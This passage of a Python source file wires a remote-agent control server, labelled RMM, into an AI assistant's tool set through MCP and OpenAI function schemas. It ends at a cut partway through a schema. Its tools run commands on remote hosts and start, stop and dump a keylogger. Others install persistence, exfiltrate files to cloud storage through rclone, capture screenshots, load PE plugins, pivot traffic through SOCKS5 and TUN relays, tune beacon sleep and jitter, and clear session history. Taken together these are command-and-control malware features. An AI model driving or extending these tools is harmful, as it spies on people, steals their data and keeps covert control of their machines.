"""
Shared RMM operator tools for MCP and web AI assistant.
Uses the same REST API as rmm_cli.py (RmmApiClient).
"""

from __future__ import annotations

import json
import os
from pathlib import Path
from typing import Any

from rmm_cli import RmmApiClient, _default_server_url

DEFAULT_RMM_URL = _default_server_url()
DEFAULT_RMM_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()


def make_client(
    base_url: str | None = None,
    token: str | None = None,
    extra_headers: dict[str, str] | None = None,
) -> RmmApiClient:
    resolved_token = DEFAULT_RMM_TOKEN if token is None else str(token).strip()
    if not resolved_token:
        resolved_token = DEFAULT_RMM_TOKEN
    headers = dict(extra_headers or {})
    workspace_id = os.environ.get("RMM_WORKSPACE_ID", "").strip()
    workspace_token = os.environ.get("RMM_WORKSPACE_TOKEN", "").strip()
    if workspace_id and workspace_token:
        headers.setdefault("X-RMM-Workspace", workspace_id)
        headers.setdefault("X-RMM-Workspace-Token", workspace_token)
    return RmmApiClient(
        (base_url or DEFAULT_RMM_URL).rstrip("/"),
        resolved_token,
        extra_headers=headers,
    )


def _json_result(payload: Any) -> str:
    return json.dumps(payload, indent=2, default=str)


def _resolve_session_id(client: RmmApiClient, session_ref: str) -> tuple[str | None, dict]:
    """Resolve full session id from prefix, full id, or hostname."""
    ref = (session_ref or "").strip()
    if not ref:
        return None, {"error": "session_ref required"}

    code, data = client.get_session(ref)
    if code == 200 and data.get("session"):
        return data["session"]["id"], data["session"]

    code, data = client.list_sessions()
    if code != 200:
        return None, {"error": "list_sessions failed", "detail": data}

    sessions = data.get("sessions", [])
    ref_upper = ref.upper()
    for s in sessions:
        if s["id"] == ref or s["id"].startswith(ref):
            return s["id"], s
    for s in sessions:
        if (s.get("hostname") or "").upper() == ref_upper:
            return s["id"], s
        if (s.get("hostname") or "").upper().startswith(ref_upper):
            return s["id"], s

    return None, {"error": "session_not_found", "session_ref": ref}


def tool_embedding_profiles(client, action="list", name="", config=None):
    """Manage secret-free embedding profiles in the selected storage owner."""
    code, data = client.embedding_profiles(action, name, config)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_run_embeddings(client, session_ref, profile, documents):
    """Queue explicit documents using a previously saved profile."""
    code, data = client.run_embeddings(session_ref, profile, documents)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_embedding_results(client, action="list", name="", session_ref="", event_id=0):
    """Save a selected output event or manage persisted result collections."""
    code, data = client.embedding_results(action, name, session_ref, event_id)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_health(client: RmmApiClient) -> str:
    code, data = client.health(timeout=5)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_list_sessions(client: RmmApiClient) -> str:
    if not client.token:
        return _json_result({
            "ok": False,
            "status": 401,
            "error": "missing_api_token",
            "detail": "Set RMM_API_TOKEN (MCP env or web UI login Bearer token)",
        })
    code, data = client.list_sessions()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    sessions = data.get("sessions", [])
    summary = [
        {
            "id": s["id"],
            "id_prefix": s["id"][:8],
            "hostname": s.get("hostname"),
            "username": s.get("username"),
            "beacon_status": s.get("beacon_status"),
            "sleep_seconds": s.get("sleep_seconds"),
            "jitter_percent": s.get("jitter_percent"),
        }
        for s in sessions
    ]
    return _json_result({"ok": True, "count": len(summary), "sessions": summary})


def tool_get_session(client: RmmApiClient, session_ref: str) -> str:
    sid, info = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, **info})
    code, data = client.get_session(sid)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    return _json_result({"ok": True, "session": data.get("session")})


def tool_exec_command(
    client: RmmApiClient,
    session_ref: str,
    command: str,
    timeout: float = 120,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.exec_command(sid, command, timeout=timeout)
    if code == 408:
        return _json_result({"ok": False, "error": "timeout", "command": command})
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    ev = data.get("event") or {}
    return _json_result({
        "ok": True,
        "command": command,
        "output": ev.get("body", ""),
        "event": ev,
    })


def tool_queue_command(
    client: RmmApiClient,
    session_ref: str,
    command: str,
    cmd_type: str = "oneshot",
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_command(sid, command, cmd_type=cmd_type)
    return _json_result({
        "ok": code == 200,
        "status": code,
        "session_id": sid,
        "queued": command,
        "data": data,
    })


def tool_patch_config(
    client: RmmApiClient,
    session_ref: str,
    sleep_seconds: int | None = None,
    jitter_percent: int | None = None,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.patch_config(sid, sleep_seconds=sleep_seconds, jitter_percent=jitter_percent)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_get_events(
    client: RmmApiClient,
    session_ref: str,
    since: int = 0,
    limit: int = 50,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.get_events(sid, since=since, limit=limit)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    return _json_result({"ok": True, "session_id": sid, "events": data.get("events", [])})


def tool_kill_session(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.kill_session(sid)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_queue_download(client: RmmApiClient, session_ref: str, remote_path: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_download(sid, remote_path)
    return _json_result({"ok": code == 200, "status": code, "queued": remote_path, "data": data})


def tool_queue_exfil(
    client: RmmApiClient,
    session_ref: str,
    remote_path: str,
    profile: str | None = None,
    dest: str | None = None,
    mode: str = "auto",
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_exfil(sid, remote_path, profile=profile, dest=dest, mode=mode)
    return _json_result({
        "ok": code == 200,
        "status": code,
        "queued": remote_path,
        "data": data,
    })


def tool_get_rclone_config(client: RmmApiClient) -> str:
    code, data = client.get_rclone_config()
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_queue_screenshot(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_screenshot(sid)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_list_plugins(client: RmmApiClient) -> str:
    code, data = client.list_plugins()
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_list_plugin_release(client: RmmApiClient, tag: str = "latest") -> str:
    """List compiled plugins and resolve the exact tag for a GitHub release."""
    code, data = client.list_plugin_release(tag)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_install_plugin_release(client: RmmApiClient, name: str, tag: str, sha256: str = "") -> str:
    """Install a verified plugin from an exact release without executing it."""
    if not tag or tag == "latest":
        return _json_result({"ok": False, "error": "exact release tag required; list_plugin_release resolves latest"})
    code, data = client.install_plugin_release(name, tag, sha256)
    return _json_result({"ok": code in (200, 201), "status": code, "data": data})


def tool_list_assets(client: RmmApiClient, kind: str = "") -> str:
    """List operator-managed URL-installed assets."""
    code, data = client.list_assets(kind or None)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_add_asset(
    client: RmmApiClient,
    kind: str,
    url: str,
    name: str = "",
    enabled: bool = True,
) -> str:
    """Download and install one operator asset from a URL."""
    code, data = client.add_asset(kind, url, name or None, enabled)
    return _json_result({"ok": code in (200, 201), "status": code, "data": data})


def tool_set_asset_enabled(client: RmmApiClient, kind: str, name: str, enabled: bool) -> str:
    """Enable or disable one managed operator asset."""
    code, data = client.set_asset_enabled(kind, name, enabled)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_remove_asset(client: RmmApiClient, kind: str, name: str) -> str:
    """Remove one managed operator asset."""
    code, data = client.remove_asset(kind, name)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_profile_status(client: RmmApiClient) -> str:
    """Return the active RMM-Profile and beacon URL."""
    code, data = client.profile_status()
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_start_profile(client: RmmApiClient, name: str = "cloudflared") -> str:
    """Start one installed RMM-Profile connector."""
    code, data = client.start_profile(name)
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_stop_profile(client: RmmApiClient) -> str:
    """Stop the active RMM-Profile connector."""
    code, data = client.stop_profile()
    return _json_result({"ok": code == 200, "status": code, "data": data})


def tool_queue_pe_load(
    client: RmmApiClient,
    session_ref: str,
    plugin: str,
    export: str = "Run",
    plugin_input: str = "",
    plugin_command: str = "",
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.queue_pe_load(
        sid,
        plugin,
        export=export,
        plugin_input=plugin_input,
        command=plugin_command or None,
    )
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_queue_upload(
    client: RmmApiClient,
    session_ref: str,
    local_path: str,
    remote_path: str,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    local = Path(local_path).expanduser()
    if not local.is_file():
        return _json_result({"ok": False, "error": "local_file_not_found", "path": str(local)})
    code, data = client.upload_file(sid, str(local), remote_path)
    return _json_result({
        "ok": code == 200,
        "status": code,
        "session_id": sid,
        "local_path": str(local),
        "remote_path": remote_path,
        "data": data,
    })


def tool_start_socks(
    client: RmmApiClient,
    session_ref: str,
    port: int = 1080,
    bind_host: str = "127.0.0.1",
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.start_socks(sid, port=port, bind_host=bind_host)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_stop_socks(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.stop_socks(sid)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_list_socks(client: RmmApiClient) -> str:
    code, data = client.list_socks()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    relays = data.get("relays", [])
    return _json_result({"ok": True, "count": len(relays), "relays": relays})


def tool_start_tun(
    client: RmmApiClient,
    session_ref: str,
    device: str,
    route: str = "",
    tun_address: str = "198.18.0.1/15",
    interface: str = "",
    mtu: int = 1500,
    udp_timeout_seconds: int = 300,
    routes: list[str] | None = None,
) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.start_tun(
        sid,
        device,
        route=route,
        routes=routes,
        tun_address=tun_address,
        interface=interface,
        mtu=mtu,
        udp_timeout_seconds=udp_timeout_seconds,
    )
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_stop_tun(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.stop_tun(sid)
    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})


def tool_list_tun(client: RmmApiClient) -> str:
    code, data = client.list_tun()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    relays = data.get("relays", [])
    return _json_result({"ok": True, "count": len(relays), "relays": relays})


def tool_queue_persistent(client: RmmApiClient, session_ref: str, command: str) -> str:
    return tool_queue_command(client, session_ref, command, cmd_type="persistent")


def tool_stop_persistent(client: RmmApiClient, session_ref: str) -> str:
    return tool_queue_command(client, session_ref, "__STOP__", cmd_type="oneshot")


def _resolve_history_ref(client: RmmApiClient, session_ref: str) -> tuple[str | None, dict]:
    """Resolve archived session id from UUID prefix, full id, or hostname."""
    ref = (session_ref or "").strip()
    if not ref:
        return None, {"error": "session_ref required"}
    code, data = client.get_history_session(ref)
    if code == 200 and data.get("session"):
        sid = data["session"].get("session_id") or ref
        return sid, data["session"]
    code, data = client.list_history()
    if code != 200:
        return None, {"error": "history_lookup_failed", "detail": data}
    ref_upper = ref.upper()
    for row in data.get("sessions", []):
        sid = row.get("session_id", "")
        if sid == ref or sid.startswith(ref):
            return sid, row
        host = (row.get("hostname") or "").upper()
        if host == ref_upper or host.startswith(ref_upper):
            return sid, row
    return None, {"error": "history_not_found", "session_ref": ref}


def tool_list_history(client: RmmApiClient) -> str:
    code, data = client.list_history()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    sessions = data.get("sessions", [])
    return _json_result({"ok": True, "count": len(sessions), "sessions": sessions})


def tool_get_history_session(client: RmmApiClient, session_ref: str) -> str:
    sid, info = _resolve_history_ref(client, session_ref)
    if not sid:
        return _json_result({"ok": False, **info})
    code, data = client.get_history_session(sid)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    return _json_result({"ok": True, "session_id": sid, "session": data.get("session")})


def tool_get_history_events(
    client: RmmApiClient,
    session_ref: str,
    since: int = 0,
    limit: int = 500,
) -> str:
    sid, info = _resolve_history_ref(client, session_ref)
    if not sid:
        return _json_result({"ok": False, **info})
    code, data = client.get_history_events(sid, since=since, limit=limit)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    return _json_result({
        "ok": True,
        "session_id": data.get("session_id") or sid,
        "events": data.get("events", []),
    })


def tool_delete_history(client: RmmApiClient, session_ref: str) -> str:
    sid, info = _resolve_history_ref(client, session_ref)
    if not sid:
        return _json_result({"ok": False, **info})
    code, data = client.delete_history(sid)
    return _json_result({
        "ok": code == 200,
        "status": code,
        "session_id": sid,
        "data": data,
    })


def tool_clear_history(client: RmmApiClient) -> str:
    code, data = client.clear_history()
    payload = data if isinstance(data, dict) else {}
    return _json_result({
        "ok": code == 200,
        "status": code,
        "deleted": payload.get("deleted", 0),
        "errors": payload.get("errors", []),
        "data": data,
    })


def tool_list_session_downloads(client: RmmApiClient, session_ref: str) -> str:
    sid, _ = _resolve_session_id(client, session_ref)
    if not sid:
        return _json_result({"ok": False, "error": "session_not_found"})
    code, data = client.list_session_downloads(sid)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    downloads = data.get("downloads", [])
    return _json_result({
        "ok": True,
        "session_id": data.get("session_id") or sid,
        "count": len(downloads),
        "downloads": downloads,
    })


def tool_list_artifacts(client: RmmApiClient, kind: str = "downloads") -> str:
    """List global downloads or screenshots with their originating agents."""
    normalized = (kind or "downloads").strip().lower()
    if normalized not in {"downloads", "screenshots"}:
        return _json_result({
            "ok": False,
            "error": "invalid_artifact_kind",
            "detail": "kind must be downloads or screenshots",
        })
    code, data = client.list_artifacts(normalized)
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    artifacts = data.get("artifacts", [])
    return _json_result({
        "ok": True,
        "kind": normalized,
        "count": len(artifacts),
        "artifacts": artifacts,
    })


def tool_get_agent_script(client: RmmApiClient) -> str:
    code, data = client.get_agent_script()
    if code != 200:
        return _json_result({"ok": False, "status": code, "data": data})
    content = data.get("content") or ""
    return _json_result({
        "ok": True,
        "filename": data.get("filename", "client_rmm.ps1"),
        "byte_length": len(content.encode("utf-8")),
        "line_count": content.count("\n") + (1 if content else 0),
        "content": content,
    })


def tool_queue_keylog(client: RmmApiClient, session_ref: str, action: str) -> str:
    act = (action or "").strip().lower()
    if act not in ("start", "stop", "dump"):
        return _json_result({
            "ok": False,
            "error": "invalid_action",
            "detail": "action must be start, stop, or dump",
        })
    return tool_queue_command(client, session_ref, f"__KEYLOG__ {act}", cmd_type="oneshot")


def tool_install_persistence(client: RmmApiClient, session_ref: str) -> str:
    return tool_queue_command(client, session_ref, "__INSTALL_PERSIST__", cmd_type="oneshot")


def tool_remove_persistence(client: RmmApiClient, session_ref: str) -> str:
    return tool_queue_command(client, session_ref, "__REMOVE_PERSIST__", cmd_type="oneshot")


TOOL_HANDLERS = {
    "embedding_profiles": lambda c, a: tool_embedding_profiles(c, a.get("action", "list"), a.get("name", ""), a.get("config")),
    "run_embeddings": lambda c, a: tool_run_embeddings(c, a["session_ref"], a["profile"], a["documents"]),
    "embedding_results": lambda c, a: tool_embedding_results(c, a.get("action", "list"), a.get("name", ""), a.get("session_ref", ""), a.get("event_id", 0)),
    "health": lambda c, a: tool_health(c),
    "list_sessions": lambda c, a: tool_list_sessions(c),
    "get_session": lambda c, a: tool_get_session(c, a["session_ref"]),
    "exec_command": lambda c, a: tool_exec_command(
        c, a["session_ref"], a["command"], float(a.get("timeout", 120))
    ),
    "queue_command": lambda c, a: tool_queue_command(
        c, a["session_ref"], a["command"], a.get("cmd_type", "oneshot")
    ),
    "patch_config": lambda c, a: tool_patch_config(
        c,
        a["session_ref"],
        a.get("sleep_seconds"),
        a.get("jitter_percent"),
    ),
    "get_events": lambda c, a: tool_get_events(
        c, a["session_ref"], int(a.get("since", 0)), int(a.get("limit", 50))
    ),
    "kill_session": lambda c, a: tool_kill_session(c, a["session_ref"]),
    "queue_download": lambda c, a: tool_queue_download(c, a["session_ref"], a["remote_path"]),
    "queue_exfil": lambda c, a: tool_queue_exfil(
        c, a["session_ref"], a["remote_path"], a.get("profile"), a.get("dest")
    ),
    "get_rclone_config": lambda c, a: tool_get_rclone_config(c),
    "queue_screenshot": lambda c, a: tool_queue_screenshot(c, a["session_ref"]),
    "list_plugins": lambda c, a: tool_list_plugins(c),
    "list_plugin_release": lambda c, a: tool_list_plugin_release(c, a.get("tag", "latest")),
    "install_plugin_release": lambda c, a: tool_install_plugin_release(c, a["name"], a["tag"], a.get("sha256", "")),
    "list_assets": lambda c, a: tool_list_assets(c, a.get("kind", "")),
    "add_asset": lambda c, a: tool_add_asset(
        c, a["kind"], a["url"], a.get("name", ""), bool(a.get("enabled", True))
    ),
    "set_asset_enabled": lambda c, a: tool_set_asset_enabled(
        c, a["kind"], a["name"], bool(a.get("enabled"))
    ),
    "remove_asset": lambda c, a: tool_remove_asset(c, a["kind"], a["name"]),
    "profile_status": lambda c, a: tool_profile_status(c),
    "start_profile": lambda c, a: tool_start_profile(c, a.get("name", "cloudflared")),
    "stop_profile": lambda c, a: tool_stop_profile(c),
    "queue_pe_load": lambda c, a: tool_queue_pe_load(
        c,
        a["session_ref"],
        a["plugin"],
        a.get("export", "Run"),
        a.get("input", ""),
        a.get("command", ""),
    ),
    "queue_upload": lambda c, a: tool_queue_upload(
        c, a["session_ref"], a["local_path"], a["remote_path"]
    ),
    "start_socks": lambda c, a: tool_start_socks(
        c,
        a["session_ref"],
        int(a.get("port", 1080)),
        str(a.get("bind_host", "127.0.0.1")),
    ),
    "stop_socks": lambda c, a: tool_stop_socks(c, a["session_ref"]),
    "list_socks": lambda c, a: tool_list_socks(c),
    "start_tun": lambda c, a: tool_start_tun(
        c,
        a["session_ref"],
        a["device"],
        route=a.get("route", ""),
        routes=a.get("routes"),
        tun_address=a.get("tun_address", "198.18.0.1/15"),
        interface=a.get("interface", ""),
        mtu=int(a.get("mtu", 1500)),
        udp_timeout_seconds=int(a.get("udp_timeout_seconds", 300)),
    ),
    "stop_tun": lambda c, a: tool_stop_tun(c, a["session_ref"]),
    "list_tun": lambda c, a: tool_list_tun(c),
    "queue_persistent": lambda c, a: tool_queue_persistent(
        c, a["session_ref"], a["command"]
    ),
    "stop_persistent": lambda c, a: tool_stop_persistent(c, a["session_ref"]),
    "list_history": lambda c, a: tool_list_history(c),
    "get_history_session": lambda c, a: tool_get_history_session(c, a["session_ref"]),
    "get_history_events": lambda c, a: tool_get_history_events(
        c, a["session_ref"], int(a.get("since", 0)), int(a.get("limit", 500))
    ),
    "delete_history": lambda c, a: tool_delete_history(c, a["session_ref"]),
    "clear_history": lambda c, a: tool_clear_history(c),
    "list_session_downloads": lambda c, a: tool_list_session_downloads(c, a["session_ref"]),
    "list_artifacts": lambda c, a: tool_list_artifacts(c, a.get("kind", "downloads")),
    "get_agent_script": lambda c, a: tool_get_agent_script(c),
    "queue_keylog": lambda c, a: tool_queue_keylog(c, a["session_ref"], a["action"]),
    "install_persistence": lambda c, a: tool_install_persistence(c, a["session_ref"]),
    "remove_persistence": lambda c, a: tool_remove_persistence(c, a["session_ref"]),
}


def execute_tool(client: RmmApiClient, name: str, arguments: dict | str) -> str:
    if isinstance(arguments, str):
        arguments = json.loads(arguments) if arguments.strip() else {}
    handler = TOOL_HANDLERS.get(name)
    if not handler:
        return _json_result({"ok": False, "error": f"unknown_tool: {name}"})
    try:
        return handler(client, arguments)
    except Exception as e:
        return _json_result({"ok": False, "error": str(e)})


OPENAI_TOOLS: list[dict] = [
    {
        "type": "function",
        "function": {
            "name": "health",
            "description": "Check RMM server API health.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_sessions",
            "description": "List all active RMM agent sessions (id, hostname, user, beacon status).",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_session",
            "description": "Get session details by session id prefix, full id, or hostname.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {
                        "type": "string",
                        "description": "Session UUID prefix, full id, or hostname (e.g. CFRANCHETZIA110)",
                    }
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "exec_command",
            "description": "Run a command on the agent and wait for output (blocking, up to timeout seconds).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "command": {"type": "string"},
                    "timeout": {"type": "number", "description": "Max wait seconds (default 120)"},
                },
                "required": ["session_ref", "command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_command",
            "description": "Queue a command for the next agent beacon (non-blocking).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "command": {"type": "string"},
                    "cmd_type": {
                        "type": "string",
                        "enum": ["oneshot", "persistent"],
                        "description": "oneshot (default) or persistent",
                    },
                },
                "required": ["session_ref", "command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "patch_config",
            "description": "Update agent beacon sleep interval and/or jitter percent.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "sleep_seconds": {"type": "integer"},
                    "jitter_percent": {"type": "integer"},
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_events",
            "description": "Fetch result/operator events for a session transcript.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "since": {"type": "integer", "description": "Event id cursor"},
                    "limit": {"type": "integer"},
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "kill_session",
            "description": "Terminate an agent session (client will exit on next beacon).",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_download",
            "description": "Queue download of a remote file from the agent.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "remote_path": {"type": "string"},
                },
                "required": ["session_ref", "remote_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_exfil",
            "description": "Queue upload of a remote agent file or folder via rclone (agent-side; link in events for files).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "remote_path": {"type": "string"},
                    "profile": {"type": "string", "description": "Named rclone profile on server"},
                    "dest": {"type": "string", "description": "Optional cloud destination path"},
                    "mode": {"type": "string", "enum": ["auto", "plugin", "binary"], "description": "Execution mode; auto prefers the in-process Go plugin and falls back to the binary"},
                },
                "required": ["session_ref", "remote_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "get_rclone_config",
            "description": "Show rclone profiles and binary status on the RMM server.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_screenshot",
            "description": "Queue a screenshot capture on the agent.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_plugins",
            "description": "List PE plugins available on the RMM server for the Go agent.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_plugin_release",
            "description": "Inspect compiled GitHub plugins and resolve latest to an exact release tag before installation.",
            "parameters": {"type": "object", "properties": {"tag": {"type": "string", "description": "latest or an exact plugins-<commit SHA> tag"}}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "install_plugin_release",
            "description": "Install one checksum-verified plugin into the current server/workspace asset store without executing it. Use an exact tag from list_plugin_release.",
            "parameters": {
                "type": "object",
                "properties": {
                    "name": {"type": "string"},
                    "tag": {"type": "string", "description": "Exact plugins-<commit SHA> release tag; latest is not accepted"},
                    "sha256": {"type": "string", "description": "Optional expected digest from the selected release"},
                },
                "required": ["name", "tag"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_assets",
            "description": "List URL-installed plugins, AI skills, and rclone profile files.",
            "parameters": {
                "type": "object",
                "properties": {
                    "kind": {"type": "string", "enum": ["plugins", "skills", "rclone"]}
                },
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "add_asset",
            "description": "Download and install a plugin, AI skill, or rclone profile file from an HTTP(S) URL.",
            "parameters": {
                "type": "object",
                "properties": {
                    "kind": {"type": "string", "enum": ["plugins", "skills", "rclone"]},
                    "url": {"type": "string"},
                    "name": {"type": "string"},
                    "enabled": {"type": "boolean"},
                },
                "required": ["kind", "url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "set_asset_enabled",
            "description": "Enable or disable one managed plugin, AI skill, or rclone asset.",
            "parameters": {
                "type": "object",
                "properties": {
                    "kind": {"type": "string", "enum": ["plugins", "skills", "rclone"]},
                    "name": {"type": "string"},
                    "enabled": {"type": "boolean"},
                },
                "required": ["kind", "name", "enabled"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "remove_asset",
            "description": "Remove one managed operator asset.",
            "parameters": {
                "type": "object",
                "properties": {
                    "kind": {"type": "string", "enum": ["plugins", "skills", "rclone"]},
                    "name": {"type": "string"},
                },
                "required": ["kind", "name"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "profile_status",
            "description": "Show the active RMM-Profile and the beacon URL used by agents.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "start_profile",
            "description": "Start an installed RMM-Profile connector such as cloudflared.",
            "parameters": {
                "type": "object",
                "properties": {"name": {"type": "string", "default": "cloudflared"}},
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "stop_profile",
            "description": "Stop the active RMM-Profile connector.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_pe_load",
            "description": (
                "Queue a PE plugin load on the Go agent. The plugin runs in an "
                "isolated child; DLLs requiring the Windows loader use a temporary file. Use "
                "command for plugin-owned dispatch through the Run export."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "plugin": {"type": "string"},
                    "export": {"type": "string", "description": "Plugin export name (default Run)"},
                    "command": {
                        "type": "string",
                        "description": (
                            "Optional plugin-owned command. When set, the agent invokes "
                            "Run and the plugin dispatches this command internally."
                        ),
                    },
                    "input": {"type": "string", "description": "Optional input passed to the export"},
                },
                "required": ["session_ref", "plugin"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "queue_upload",
            "description": "Upload a local file (on the MCP host) to a remote path on the agent.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "local_path": {"type": "string"},
                    "remote_path": {"type": "string"},
                },
                "required": ["session_ref", "local_path", "remote_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_socks",
            "description": "List all active SOCKS5 relays on the RMM server and which agent each uses.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "start_socks",
            "description": "Start SOCKS5 relay on the RMM server (traffic exits via agent).",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "port": {"type": "integer", "description": "Default 1080"},
                    "bind_host": {"type": "string", "description": "Default 127.0.0.1"},
                },
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "stop_socks",
            "description": "Stop SOCKS5 relay for the session.",
            "parameters": {
                "type": "object",
                "properties": {"session_ref": {"type": "string"}},
                "required": ["session_ref"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_tun",
            "description": "List active RMM-owned TUN relays configured on the server.",
            "parameters": {"type": "object", "properties": {}},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "start_tun",
            "description": "Create a server-side TUN relay whose traffic exits through a Go agent.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_ref": {"type": "string"},
                    "device": {"type": "string", "description": "Server TUN device, for example tun://rmm0 or utun4"},
                    "route": {"type": "string", "description": "Optional IPv4 CIDR routed through the agent"},
                    "routes": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Optional IPv4 CIDRs routed through the agent; use this for multiple networks",
                    },
                    "tun_address": {"type": "string", "description": "IPv4 address/prefix assigned to the TUN"},
                    "interface": {"type": "string", "description": "Physical egress interface for the helper"},
